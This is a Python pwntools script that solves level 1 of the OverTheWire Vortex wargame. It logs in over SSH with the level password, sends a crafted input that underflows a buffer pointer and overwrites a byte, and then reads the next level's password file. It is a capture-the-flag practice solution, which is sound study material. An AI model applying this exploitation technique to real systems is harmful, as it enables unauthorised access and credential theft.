from pwn import *
import pwnlib.log

s = ssh(host='vortex.labs.overthewire.org', user='vortex1', password='Gq#qu3bF3')
v = s.run('/vortex/vortex1')

offset = 5
bufsize = 512
ptr = bufsize/2
v.send('\\' * (ptr + offset) + '\xca' + '\\a')
v.clean()
v.send('cat /etc/vortex_pass/vortex2\n')
log.success('Password: {}'.format(v.recv()))
